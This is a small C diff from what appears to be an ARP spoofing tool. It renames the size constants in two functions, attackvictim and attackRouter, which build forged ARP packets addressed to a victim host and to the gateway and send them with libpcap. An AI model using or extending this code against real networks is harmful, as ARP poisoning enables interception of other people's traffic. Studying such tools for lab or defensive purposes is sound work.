@@ -20,8 +20,8 @@ int attackvictim(pcap_t* handle, PARP_PACKET arpPacket, PLANINFO LanInfo)
 	memcpy(arpPacket->arp.dst_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
 	memcpy(arpPacket->arp.dst_IP, &LanInfo->victimIP, sizeof(IN_ADDR));
 	/* fill Pacekt */
-	memcpy(packet, &(arpPacket->ethernet), sizeof(u_char) * ETHERNET_SIZE);
-	memcpy(packet + ETHERNET_SIZE, &(arpPacket->arp), sizeof(u_char) * ARP_SIZE);
+	memcpy(packet, &(arpPacket->ethernet), sizeof(u_char) * ETHERNET_HEADER_SIZE);
+	memcpy(packet + ETHERNET_HEADER_SIZE, &(arpPacket->arp), sizeof(u_char) * ARP_HEADER_SIZE);
 	/* send to victim */
 	if (pcap_sendpacket(handle, packet, ARP_PACKET_SIZE) != 0)
 	{
@@ -41,8 +41,8 @@ int attackRouter(pcap_t* handle, PARP_PACKET arpPacket, PLANINFO LanInfo)
 	memcpy(arpPacket->arp.dst_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
 	memcpy(arpPacket->arp.dst_IP, &LanInfo->gatewayIP, sizeof(IN_ADDR));
 	/* fill Pacekt */
-	memcpy(packet, &(arpPacket->ethernet), sizeof(u_char) * ETHERNET_SIZE);
-	memcpy(packet + ETHERNET_SIZE, &(arpPacket->arp), sizeof(u_char) * ARP_SIZE);
+	memcpy(packet, &(arpPacket->ethernet), sizeof(u_char) * ETHERNET_HEADER_SIZE);
+	memcpy(packet + ETHERNET_HEADER_SIZE, &(arpPacket->arp), sizeof(u_char) * ARP_HEADER_SIZE);
 	/* send to router */
 	if (pcap_sendpacket(handle, packet, ARP_PACKET_SIZE) != 0)
 	{
